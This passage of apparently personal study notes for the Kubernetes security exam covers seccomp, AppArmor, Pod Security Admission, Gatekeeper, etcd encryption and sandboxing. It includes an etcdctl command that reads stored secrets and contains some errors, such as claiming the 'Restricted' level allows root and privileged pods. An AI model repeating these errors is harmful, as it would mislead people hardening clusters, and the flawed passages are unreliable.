<li>You can also attach <code>strace</code> to a running process like this:
<pre><code>strace -p &lt;PID&gt;
</code></pre>
</li>
</ul>
<h3 id="aquasec-tracee"><a class="header" href="#aquasec-tracee">AquaSec Tracee</a></h3>
<ul>
<li><code>tracee</code> is an open source tool created by AquaSec</li>
<li>Uses eBPF (extended Berkely Packet Filter) to trace syscalls on a system. eBPF runs programs directly within the kernel space without loading any kernel modules. As a result, tools that use eBPF are more efficient and typically use less resources.</li>
<li><code>tracee</code> can be run by using the binaries or as a container</li>
</ul>
<h3 id="restricting-access-to-syscalls-with-seccomp"><a class="header" href="#restricting-access-to-syscalls-with-seccomp">Restricting Access to syscalls with seccomp</a></h3>
<ul>
<li>
<p><code>seccomp</code> can be used to restrict a process‚Äô access to syscalls. It allows access to the most commonly used syscalls, while restricting access to syscalls that can be considered dangerous.</p>
</li>
<li>
<p>To see if <code>seccomp</code> is enabled:</p>
<pre><code>grep -i seccomp /boot/config-$(uname -r)
</code></pre>
</li>
<li>
<p><code>seccomp</code> can operate in 1 of 3 modes:</p>
<ul>
<li><code>mode 0</code>: disabled</li>
<li><code>mode 1</code>: strict (blocks nearly all syscalls, except for 4)</li>
<li><code>mode 2</code>: selectively filters syscalls</li>
<li>To see which mode the process is currently running in:
<code>grep -i seccomp /proc/1/status</code> where ‚Äò1‚Äô is the PID of the process</li>
</ul>
</li>
<li>
<p><code>seccomp</code> profiles</p>
<ul>
<li>Kubernetes provides a default <code>seccomp</code> profile, that can be either restrictive or permissive, depending on your configuration</li>
<li>You can create custom profiles to fine-tune <code>seccomp</code> and which syscalls it blocks or allows within a containers</li>
<li>Example <code>seccomp</code> profile for <code>mode 1</code>:
<pre><code>{
  "defaultAction": "SCMP_ACT_ERRNO",
  "archMap": [
    { "architecture": "SCMP_ARCH_X86_64", "subArchitectures": [] }
  ],
  "syscalls": [
    {
      "names": ["read", "write", "exit", "sigreturn"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
</code></pre>
</li>
</ul>
</li>
<li>
<p>To apply a <code>seccomp</code> profile to a pod:</p>
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: audit-pod
  labels:
    app: audit-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json #this path is relative to default seccomp profile location (/var/lib/kubelet/seccomp)
  containers:
  - name: test-container
    image: hashicorp/http-echo:1.0
    args:
    - "-text=just made some syscalls!"
    securityContext:
      allowPrivilegeEscalation: false
</code></pre>
</li>
</ul>
<h2 id="restrict-access-to-file-systems"><a class="header" href="#restrict-access-to-file-systems">Restrict access to file systems</a></h2>
<h3 id="apparmor"><a class="header" href="#apparmor">AppArmor</a></h3>
<ul>
<li>
<p>AppArmor can be used to limit a containers‚Äô access to resources on the host. Why do we need apparmor if we have traditional discretionary access controls (file system permissions, etc.)? With discretionary access control, a running process will inherit the permissions of the user who started it. Likely more permissions than the process needs. AppArmor is a mandatory access control implementation that allows one to implement fine-grained controls over what a process can access or do on a system.</p>
</li>
<li>
<p>AppArmor runs as a daemon on Linux systems. You can check it‚Äôs status using <code>systemctl</code>:
<code>systemctl status apparmor</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-status</code></li>
</ul>
</li>
<li>
<p>To use AppArmor, the kernel module must also be loaded. The check status:
<code>cat /sys/module/apparmor/parameters/enabled</code>
Y = loaded</p>
</li>
<li>
<p>AppArmor profiles define what a process can and cannot do and are stored in <code>/etc/apparmor.d/</code>. Profiles need to be copied to every worker node and loaded.</p>
</li>
<li>
<p>Every profile needs to be loaded into AppArmor before it can take effect</p>
<ul>
<li>To view loaded profiles, run <code>aa-status</code></li>
</ul>
</li>
<li>
<p>To load a profile:
<code>apparmor_parser -r -W /path/to/profile</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-enforce</code> to load a profile</li>
</ul>
</li>
<li>
<p>Profiles are loaded in ‚Äòenforce‚Äô mode by default. To change the mode to ‚Äòcomplain‚Äô:
<code>apparmor_parser -C /path/to/profile</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-complain</code> to change the mode</li>
</ul>
</li>
<li>
<p>To view loaded apparmor profiles:</p>
<pre><code>  kubeadmin@kube-controlplane:~$ sudo cat /sys/kernel/security/apparmor/profiles
  cri-containerd.apparmor.d (enforce)
  wpcom (unconfined)
  wike (unconfined)
  vpnns (unconfined)
  vivaldi-bin (unconfined)
  virtiofsd (unconfined)
  rsyslogd (enforce)
  vdens (unconfined)
  uwsgi-core (unconfined)
  /usr/sbin/chronyd (enforce)
  /usr/lib/snapd/snap-confine (enforce)
  /usr/lib/snapd/snap-confine//mount-namespace-capture-helper (enforce)
  tcpdump (enforce)
  man_groff (enforce)
  man_filter (enforce)
  ....
</code></pre>
<p>or:</p>
<pre><code>  root@controlplane00:/etc/apparmor.d# aa-status
  apparmor module is loaded.
  33 profiles are loaded.
  12 profiles are in enforce mode.
     /home/rtn/tools/test.sh
     /usr/bin/man
     /usr/lib/NetworkManager/nm-dhcp-client.action
     /usr/lib/NetworkManager/nm-dhcp-helper
     /usr/lib/connman/scripts/dhclient-script
     /usr/sbin/chronyd
     /{,usr/}sbin/dhclient
     lsb_release
     man_filter
     man_groff
     nvidia_modprobe
     nvidia_modprobe//kmod
  21 profiles are in complain mode.
     avahi-daemon
     dnsmasq
     dnsmasq//libvirt_leaseshelper
     identd
     klogd
     mdnsd
     nmbd
     nscd
     php-fpm
     ping
     samba-bgqd
     samba-dcerpcd
     samba-rpcd
     samba-rpcd-classic
     samba-rpcd-spoolss
     smbd
     smbldap-useradd
     smbldap-useradd///etc/init.d/nscd
     syslog-ng
     syslogd
     traceroute
  0 profiles are in kill mode.
  0 profiles are in unconfined mode.
  4 processes have profiles defined.
  2 processes are in enforce mode.
     /usr/sbin/chronyd (704)
     /usr/sbin/chronyd (708)
  2 processes are in complain mode.
     /usr/sbin/avahi-daemon (587) avahi-daemon
     /usr/sbin/avahi-daemon (613) avahi-daemon
  0 processes are unconfined but have a profile defined.
  0 processes are in mixed mode.
  0 processes are in kill mode.
</code></pre>
</li>
<li>
<p>AppArmor defines profile modes that determine how the profile behaves:</p>
<ul>
<li>Modes:
<ul>
<li>Enforced: Action is taken and the application is allowed/blocked from performing defined actions. Events are logged in syslog.</li>
<li>Complain: Events are logged but no action is taken</li>
<li>Unconfined: application can perform any task and no event is logged</li>
</ul>
</li>
</ul>
</li>
<li>
<p>AppArmor Tools</p>
<ul>
<li>Can be used to generate apparmor profiles</li>
<li>To install: <code>apt install -y apparmor-utils</code></li>
<li>Run <code>aa-genprof</code> to generate a profile:
<code>aa-genprof ./my-application</code></li>
</ul>
</li>
<li>
<p>Before applying an AppArmor profile to a pod, you must ensure the container runtime supports AppArmor. You must also ensure AppArmor is installed on the worker node and that all necessary profiles are loaded.</p>
</li>
<li>
<p>To apply an AppArmor profile to a pod, you must add the following security profile (K8s 1.30+):</p>
<pre><code>securityContext:
  appArmorProfile:
    type: &lt;profile_type&gt;
    localhostProfile: &lt;profile_name&gt;
</code></pre>
<ul>
<li>&lt;profile_type&gt; can be one of 3 values: <code>Unconfined</code>, <code>RuntimeDefault</code>, or <code>Localhost</code>
<ul>
<li><code>Unconfined</code> means the container is not restricted by AppArmor</li>
<li><code>RuntimeDefault</code> means the container will use the default AppArmor profile</li>
<li><code>Localhost</code> means the container will use a custom profile</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="deep-dive-into-apparmor-profiles"><a class="header" href="#deep-dive-into-apparmor-profiles">Deep Dive into AppArmor Profiles</a></h4>
<p>AppArmor profiles define security rules for specific applications, specifying what they can and cannot do. These profiles reside in <code>/etc/apparmor.d/</code> and are loaded into the kernel to enforce security policies.</p>
<ul>
<li>Each profile follows these structure:</li>
</ul>
<pre><code>profile &lt;profile_name&gt; &lt;executable_path&gt; {
    &lt;rules&gt;
}
</code></pre>
<ul>
<li>Example profile, a profile for nano:</li>
</ul>
<pre><code>profile nano /usr/bin/nano {
    # Allow reading any file
    file,

    # Deny writing to system directories
    deny /etc/* rw,
}
</code></pre>
<ul>
<li>Types of AppArmor rules:
<ul>
<li>File Access Rules:
<pre><code>    /home/user/data.txt r       # Read-only access
    /etc/passwd rw              # Read &amp; write access
    /tmp/ rw                    # Full access to /tmp
</code></pre>
</li>
<li>Network Access Rules:
<pre><code>    network inet tcp,           # Allow TCP connections
    network inet udp,           # Allow UDP connections
    network inet dgram,         # Allow datagram connections
</code></pre>
</li>
<li>Capability Rules:</li>
</ul>
<pre><code>deny capability sys_admin,       # Deny sys_admin capability
deny capability sys_ptrace,      # Deny sys_ptrace capability
</code></pre>
</li>
</ul>
<h2 id="linux-capabilities-in-pods"><a class="header" href="#linux-capabilities-in-pods">Linux Capabilities in Pods</a></h2>
<ul>
<li>For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process‚Äôs credentials (usually: effective UID, effective GID, and supplementary group list).</li>
<li>Starting with Linux 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled.  Capabilities are a per-thread attribute.</li>
<li>Capabilities control what a process can do</li>
<li>Some common capabilities
<ul>
<li><code>CAP_SYS_ADMIN</code></li>
<li><code>CAP_NET_ADMIN</code></li>
<li><code>CAP_NET_RAW</code></li>
</ul>
</li>
<li>To view the capabilities of a process:
<ul>
<li><code>getcap</code> - Check the capabilities of a binary - <code>getcap &lt;path to bin&gt;</code></li>
<li><code>getpcaps</code> - Check the capabilities of a process - <code>getpcaps &lt;pid&gt;</code></li>
</ul>
</li>
</ul>
<h1 id="4-minimize-microservice-vulnerabilities"><a class="header" href="#4-minimize-microservice-vulnerabilities">4 Minimize Microservice Vulnerabilities</a></h1>
<h2 id="pod-security-admission"><a class="header" href="#pod-security-admission">Pod Security Admission</a></h2>
<ul>
<li>Replaced Pod Security Policies</li>
<li>Pod Security Admission controller enforces pod security standards on pods</li>
<li>All you need to do to opt into the PSA feature is to add a label with a specific format to a namespace. All pods in that namespace will have to follow the standards declared.
<ul>
<li>The label consists of three parts: a prefix, a mode, and a level</li>
<li>Example: <code>pod-security.kubernetes.io/restricted=privileged</code></li>
<li>Prefix: <code>pod-security.kubernetes.io</code></li>
<li>Mode: <code>enforce</code>, <code>audit</code>, or <code>warn</code>
<ul>
<li>Enforce: blocks pods that do not meet the PSS</li>
<li>Audit: logs violations to the audit log but does not block pod creation</li>
<li>Warn: logs violations on the console but does not block pod created</li>
</ul>
</li>
<li>Level: <code>privileged</code>, <code>baseline</code>, or <code>restricted</code>
<ul>
<li>Privileged: fully unrestricted
<ul>
<li>Allowed: everything</li>
</ul>
</li>
<li>Baseline: some restrictions
<ul>
<li>Allowed: most things, except sharing host namespaces, hostPath volumes and hostPorts, and privileged pods</li>
</ul>
</li>
<li>Restricted: most restrictions
<ul>
<li>Allowed: very few things, like running as root, using host networking, hostPath volumes, hostPorts, and privileged pods. The pod must be configured with a seccomp profile.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="security-contexts"><a class="header" href="#security-contexts">Security Contexts</a></h2>
<ul>
<li>Security contexts are used to control the security settings of a pod or container</li>
<li>Security contexts can be defined at the pod level or the container level. Settings defined at the container level will override identical settings defined at the pod level</li>
<li>Security contexts can be used to:
<ul>
<li>Run a pod as a specific user</li>
<li>Run a pod as a specific group</li>
<li>Run a pod with specific Linux capabilities</li>
<li>Run a pod with a read-only root filesystem</li>
<li>Run a pod with a specific SELinux context</li>
<li>Run a pod with a specific AppArmor profile</li>
</ul>
</li>
<li>You can view the capabilities of a process by viewing the status file of the process and grepping for capabilities:
<pre><code>rtn@worker02:~$ cat /proc/self/status |grep -i cap
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
</code></pre>
</li>
</ul>
<p>These values are encoded in hexadecimal. To decode them, use the <code>capsh</code> command:
<code>    rtn@worker02:~$ sudo capsh --decode=000001ffffffffff     0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore    </code></p>
<h2 id="admission-controllers"><a class="header" href="#admission-controllers">Admission Controllers</a></h2>
<ul>
<li>Admission Controllers are used for automation within a cluster</li>
<li>Once a request to the KubeAPI server has been authenticated and then authorized, it is intercepted and handled by any applicable Admission Controllers</li>
<li>Example Admission Controllers:
<ul>
<li>ImagePolicyWebook
<ul>
<li>You may see this one on the exam.</li>
<li>When enabled, the ImagePolicyWebook admission controller contacts an external service (that you or someone else wrote in whatever language you want, it just needs to accept and respond to HTTP requests).</li>
<li>To enable, add ‚ÄòImagePolicyWebook‚Äô to the ‚Äò‚Äìenable-admission-plugins‚Äô flag of the kube-api server</li>
<li>You must also supply an AdmissionControlFileFile file, which is a kubeconfig formatted file. Then pass the path to this config to the kube-api server with the <code>--admission-control-config-file=&lt;path to config file&gt;</code>. Note that this path is the path inside the kube-api container, so you must mount this path on the host to the pod as a <code>hostPath</code> mount.</li>
</ul>
</li>
<li>AlwaysPullImages</li>
<li>DefaultStorageClass</li>
<li>EventRateLimit</li>
<li>NamespaceExists</li>
<li>‚Ä¶ and many more</li>
</ul>
</li>
<li>Admission Controllers help make Kubernetes modular</li>
<li>To see which Admission Controllers are enabled:
<ul>
<li>you can either grep the kubeapi process:
<code>ps aux |grep -i kube-api | grep -i admission</code></li>
<li>or you can look at the manifest for the KubeAPI server (if the cluster was provisioned with KubeADM)
<code>grep admission -A10 /etc/kubernetes/manifests/kube-apiserver.yaml</code></li>
<li>or if the cluster was provisioned manually you can look at the systemd unit file for the kube-api server daemon</li>
</ul>
</li>
<li>There are two types of admission controllers:
<ul>
<li>Mutating - can make changes to ‚Äòautocorrect‚Äô</li>
<li>Validating - only validates configuration</li>
<li>Mutating are invoked first. Validating second.</li>
</ul>
</li>
<li>The admission controller runs as a webhook server. It can run inside the cluster as a pod or outside the cluster on another server.</li>
<li>Some admission-controllers required a configuration file to be passed to the kube-api server. This file is passed using the <code>--admission-control-config-file</code> flag.</li>
</ul>
<h2 id="open-policy-agent"><a class="header" href="#open-policy-agent">Open Policy Agent</a></h2>
<ul>
<li>OPA can be used for authorization. However, it is more likely to be used in the admission control phase.</li>
<li>OPA can be deployed as a daemonset on a node or as a pod</li>
<li>OPA policies use a language called rego</li>
</ul>
<h3 id="opa-in-kubernetes"><a class="header" href="#opa-in-kubernetes">OPA in Kubernetes</a></h3>
<h4 id="gatekeeper"><a class="header" href="#gatekeeper">GateKeeper</a></h4>
<ul>
<li>
<p>Gatekeeper Constraint Framework</p>
<ul>
<li>Gatekeeper is a validating and mutating webhook that enforces CRD-based policies executed by Open Policy Agent, a policy engine for Cloud Native environments hosted by CNCF as a graduated project.</li>
<li>The framework that helps us implement what, where, and how we want to do something in Kubernetes
<ul>
<li>Example:
<ul>
<li>What: Add labels, etc.</li>
<li>Where: kube-system namespace</li>
<li>How: When a pod is created</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>To run Gatekeeper in Kubernetes, simply apply the manifests provided by OPA</p>
</li>
<li>
<p>The pods and other resources are created in the gatekeeper-system namespace</p>
</li>
<li>
<p>Constraint Templates</p>
<ul>
<li>
<p>Before you can define a constraint, you must first define a ConstraintTemplate, which describes both the Rego that enforces the constraint and the schema of the constraint. The schema of the constraint allows an admin to fine-tune the behavior of a constraint, much like arguments to a function.</p>
</li>
<li>
<p>Here is an example constraint template that requires all labels described by the constraint to be present:</p>
<pre><code>```
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        # Schema for the `parameters` field
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg, "details": {"missing_labels": missing}}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) &gt; 0
          msg := sprintf("you must provide labels: %v", [missing])
        }
```
</code></pre>
</li>
</ul>
</li>
<li>
<p>Constraints</p>
<ul>
<li>Constraints are then used to inform Gatekeeper that the admin wants a ConstraintTemplate to be enforced, and how. This constraint uses the K8sRequiredLabels constraint template above to make sure the gatekeeper label is defined on all namespaces:
<pre><code>  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sRequiredLabels
  metadata:
    name: ns-must-have-gk
  spec:
    match:
      kinds:
        - apiGroups: [""]
          kinds: ["Namespace"]
    parameters:
      labels: ["gatekeeper"]
</code></pre>
</li>
<li>The <code>match</code> field supports multiple options: https://open-policy-agent.github.io/gatekeeper/website/docs/howto#the-match-field</li>
</ul>
</li>
<li>
<p>After creating the constraint from the constrainttemplate, you can view all violations by describing the constraint:</p>
<ul>
<li>Example:
<code>kubectl describe k8srequiredlabels ns-must-have-gk</code></li>
</ul>
</li>
</ul>
<h2 id="kubernetes-secrets"><a class="header" href="#kubernetes-secrets">Kubernetes Secrets</a></h2>
<ul>
<li>Secrets are used to store sensitive information in Kubernetes</li>
<li>base64 encoded when stored in etcd</li>
<li>Can be injected into a pod as an env or mounted as a volume</li>
</ul>
<h2 id="encrypting-etcd"><a class="header" href="#encrypting-etcd">Encrypting etcd</a></h2>
<ul>
<li>
<p>By default, the API server stores plain-text representations of resources into etcd, with no at-rest encryption.</p>
</li>
<li>
<p>The kube-apiserver process accepts an argument ‚Äìencryption-provider-config that specifies a path to a configuration file. The contents of that file, if you specify one, control how Kubernetes API data is encrypted in etcd.</p>
</li>
<li>
<p>If you are running the kube-apiserver without the ‚Äìencryption-provider-config command line argument, you do not have encryption at rest enabled. If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies the identity provider as the first encryption provider in the list, then you do not have at-rest encryption enabled (the default identity provider does not provide any confidentiality protection.)</p>
</li>
<li>
<p>If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies a provider other than identity as the first encryption provider in the list, then you already have at-rest encryption enabled. However, that check does not tell you whether a previous migration to encrypted storage has succeeded.</p>
</li>
<li>
<p>Example EncryptionConfiguration:</p>
<pre><code>  apiVersion: apiserver.config.k8s.io/v1
  kind: EncryptionConfiguration
  resources:
    - resources:
        - secrets
        - configmaps
        - pandas.awesome.bears.example # a custom resource API
      providers:
        # This configuration does not provide data confidentiality. The first
        # configured provider is specifying the "identity" mechanism, which
        # stores resources as plain text.
        #
        - identity: {} # plain text, in other words NO encryption
        - aesgcm:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - aescbc:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - secretbox:
            keys:
              - name: key1
                secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
    - resources:
        - events
      providers:
        - identity: {} # do not encrypt Events even though *.* is specified below
    - resources:
        - '*.apps' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key2
              secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
    - resources:
        - '*.*' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key3
              secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
</code></pre>
</li>
<li>
<p>Each resources array item is a separate config and contains a complete configuration. The resources.resources field is an array of Kubernetes resource names (resource or resource.group) that should be encrypted like Secrets, ConfigMaps, or other resources.</p>
</li>
<li>
<p>https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/</p>
</li>
<li>
<p>After enabling encryption in etcd, any secrets that you created prior to enabling encryption will not be encrypted. You can encrypt them by running:</p>
</li>
</ul>
<pre><code>kubectl get secrets -A -o yaml | kubectl replace -f -
</code></pre>
<ul>
<li>Example of getting a secret in etcd:</li>
</ul>
<pre><code>ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt --key=/etc/kubernetes/pki/apiserver-etcd-client.key get /registry/secrets/three/con1
</code></pre>
<p>The path to the resource in the etcd database is ‚Äò/registry/<resource type="">/<namespace>/<resource name="">‚Äô</resource></namespace></resource></p>
<h2 id="container-sandboxing"><a class="header" href="#container-sandboxing">Container Sandboxing</a></h2>
<ul>
<li>Containers are not contained!</li>
<li>A container sandbox is a mechanism that provides an additional layer of isolation between the container and the host</li>
<li>Container sandboxing is implemented via Runtime Class objects in Kubernetes.</li>
<li>The default container runtime is <code>runc</code>. However, we can change this to use <code>runsc</code> (gvisor) or Kata</li>
<li>Sandboxing prevents the dirty cow exploit, which allows a user to gain root access to the host
<ul>
<li>Dirty COW works by exploiting a race condition in the Linux kernel</li>
</ul>
</li>
</ul>
<h3 id="gvisor"><a class="header" href="#gvisor">gVisor</a></h3>
<ul>
<li>gVisor is a kernel written in Golang that intercepts system calls made by a container</li>
<li>gVisor is like a ‚Äòsyscall proxy‚Äô that sits between the container and the kernel
<ul>
<li>components
<ul>
<li>sentry -</li>
<li>gofer -</li>
</ul>
</li>
</ul>
</li>
<li>Not all apps will work with gVisor</li>
<li>gVisor will cause performance degradation in your app due to the additional time taken</li>
<li>gVisor uses runsc as the runtime handler</li>
</ul>
<h3 id="kata-containers"><a class="header" href="#kata-containers">Kata Containers</a></h3>
<ul>
<li>Kata inserts each container into it‚Äôs own virtual machine, giving each it‚Äôs own kernel</li>
<li>Kata containers require nested virtualisation support, so it may not work with all cloud providers</li>
</ul>
<h3 id="runtimeclass"><a class="header" href="#runtimeclass">RuntimeClass</a></h3>
<ul>
<li>RuntimeClass is a new feature in Kubernetes that allows you to specify which runtime to use for a pod</li>
</ul>
<h4 id="to-use-a-runtime-class"><a class="header" href="#to-use-a-runtime-class">To use a runtime class</a></h4>
<ul>
<li>
<p>Create a new <code>runtimeclass</code> object:</p>
<pre><code>apiVersion: node.k8s.io/v1
handler: runsc
kind: RuntimeClass
metadata:
  name: secure-runtime
</code></pre>
</li>
<li>
<p>Specify the <code>runtimeClassName</code> in the pod definition:</p>
<pre><code>apiVersion: v1
kind: Pod
metadata:
    name: simple-webapp-1
    labels:
        name: simple-webapp
spec:
    runtimeClassName: secure-runtime
    containers:
    - name: simple-webapp
      image: kodekloud/webapp-delayed-start
      ports:
      - containerPort: 8080

</code></pre>
</li>
</ul>
<h2 id="resource-quotas"><a class="header" href="#resource-quotas">Resource Quotas</a></h2>
<ul>
<li>Control requests and limits for CPU and memory within a namespace</li>
</ul>
<pre><code>apiVersion: v1
kind: ResourceQuota
metadata:
  name: team-a-resource-quota
  namespace: team-a
spec:
  hard:
    pods: "5"
    requests.cpu: "0.5"
    requests.memory: 500Mi
    limits.cpu: "1"
    limits.memory: 1Gi
</code></pre>
<pre><code>apiVersion: v1
kind: ResourceQuota
metadata:
name: pods-medium
spec:
    hard:
      cpu: "10"
      memory: 20Gi
      pods: "10"
scopeSelector:
  matchExpressions:
  - operator : In
    scopeName: PriorityClass
    values: ["medium"]
</code></pre>
<h2 id="api-priority-and-fairness"><a class="header" href="#api-priority-and-fairness">API Priority and Fairness</a></h2>
<ul>
<li>https://kubernetes.io/docs/concepts/cluster-administration/flow-control/</li>
<li>With API Priority and Fairness, you can define which resources need to be prioritized over others in regards to requests to the KubeAPI server</li>
<li>To configure API Priority and Fairness, you create a <code>PriorityLevelConfiguration</code> object:
<pre><code>  ? Is this still supported? Is it an exam topic? I cannot find the manifest spec.
</code></pre>
</li>
</ul>
<h2 id="pod-priority-and-preemption"><a class="header" href="#pod-priority-and-preemption">Pod Priority and Preemption</a></h2>
<ul>
<li>With Pod Priority and Preemption, you can ensure that critical pods are running while the cluster is under resource contention by killing lower priority pods</li>
<li>To implement Pod Priority and Preemption:
<ul>
<li>Create a <code>priorityClass object</code> (or several):
<pre><code>apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
    apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: low-priority
value: 100
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
</code></pre>
</li>
<li>Assign the <code>priorityClass</code> to a pod:
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: nginx
  labels:
    env: test
spec:
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
  priorityClassName: high-priority
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="pod-to-pod-encryption"><a class="header" href="#pod-to-pod-encryption">Pod to Pod Encryption</a></h2>
<ul>
<li>mTLS can be used to encrypt traffic between pods</li>
<li>Methods of p2p encryption
<ul>
<li>Service Mesh
<ul>
<li>Service Mesh can offload the encryption and decryption of traffic between pods by using a sidecar proxy</li>
<li>Examples:
<ul>
<li>Istio
<ul>
<li>Istio uses Envoy as a sidecar proxy</li>
<li>Istio uses a sidecar proxy to encrypt traffic between pods</li>
</ul>
</li>
<li>Linkerd</li>
</ul>
</li>
</ul>
</li>
<li>Wireguard
<ul>
<li>Cilium
<ul>
<li>uses eBPF for network security</li>
<li>Encrytion is transparent to the application</li>
<li>Provides flexible encryption options</li>
</ul>
</li>
</ul>
</li>
<li>IPSec
<ul>
<li>Calico</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="5-supply-chain-security"><a class="header" href="#5-supply-chain-security">5 Supply Chain Security</a></h1>
<h2 id="sbom"><a class="header" href="#sbom">SBOM</a></h2>
<ul>
<li>Supply chain security is the practice of ensuring that the software and hardware that you use in your environment is secure</li>
<li>In the context of the CKS exam, supply chain security refers to the security of the software that you use in your Kubernetes environment</li>
</ul>
<h2 id="reduce-docker-image-size"><a class="header" href="#reduce-docker-image-size">Reduce docker image size</a></h2>
<ul>
<li>
<p>Smaller images are faster to download and deploy</p>
</li>
<li>
<p>Smaller images are more secure</p>
</li>
<li>
<p>Smaller images are easier to manage</p>
</li>
<li>
<p>To reduce the size of a docker image:</p>
<ul>
<li>Use a smaller base image</li>
<li>Use specific package/image versions</li>
<li>Make file-system read-only</li>
<li>Don‚Äôt run the container as root</li>
<li>Use multi-stage builds</li>
<li>Remove unnecessary files</li>
<li>Use a <code>.dockerignore</code> file to exclude files and directories from the image</li>
<li>Use <code>COPY</code> instead of <code>ADD</code></li>
<li>Use <code>alpine</code> images</li>
<li>Use <code>scratch</code> images</li>
<li>Use <code>distroless</code> images</li>
</ul>
</li>
<li>
<p>Example of a multi-stage build:</p>
<pre><code># build container stage 1
  FROM ubuntu
  ARG DEBIAN_FRONTEND=noninteractive
  RUN apt-get update &amp;&amp; apt-get install -y golang-go
  COPY app.go .
  RUN CGO_ENABLED=0 go build app.go

# app container stage 2
  FROM alpine:3.12.1 # it is better to use a defined tag, rather than 'latest'
  RUN addgroup -S appgroup &amp;&amp; adduser -S appuser -G appgroup -h /home/appuser
  COPY --from=0 /app /home/appuser/app
  USER appuser # run as a non-root user
  CMD ["/home/appuser/app"]
</code></pre>
</li>
<li>
<p>Dockerfile best practices: https://docs.docker.com/build/building/best-practices/</p>
</li>
<li>
<p>Only certain docker directives create new layers in an image</p>
<ul>
<li><code>FROM</code></li>
<li><code>COPY</code></li>
<li><code>CMD</code></li>
<li><code>RUN</code></li>
</ul>
</li>
<li>
<p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
</li>
</ul>
<h2 id="static-analysis"><a class="header" href="#static-analysis">Static Analysis</a></h2>
<h3 id="sbom-1"><a class="header" href="#sbom-1">SBOM</a></h3>
<ul>
<li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
<li>Formats
<ul>
<li>SPDX
<ul>
<li>The standard format for sharing SBOM</li>
<li>Available in JSON, RDF, and tag/value formats</li>
<li>More complex than CycloneDX due to it‚Äôs extensive metadata coverage</li>
<li>Comprehensive metadata including license information, origin, and file details</li>
</ul>
</li>
<li>CycloneDX
<ul>
<li>A lightweight format focused on security and compliance</li>
<li>Available in JSON and XML formats</li>
<li>Simpler and more focused on essential SBOM elements</li>
<li>Focuses on component details, vulnerabilities, and dependencies</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kubesec"><a class="header" href="#kubesec">Kubesec</a></h3>
<ul>
<li>Used for static analysis of manifests</li>
<li>https://github.com/controlplaneio/kubesec</li>
</ul>
<h3 id="syft"><a class="header" href="#syft">Syft</a></h3>
<ul>
<li>Syft is a powerful and easy-to-use open-source tool for generating Software Bill of Materials (SBOMs) for container images and filesystems. It provides detailed visibility into the packages and dependencies in your software, helping you manage vulnerabilities, license compliance, and software supply chain security.</li>
<li>Syft can export results in SPDX, CycloneDX, JSON, etc.</li>
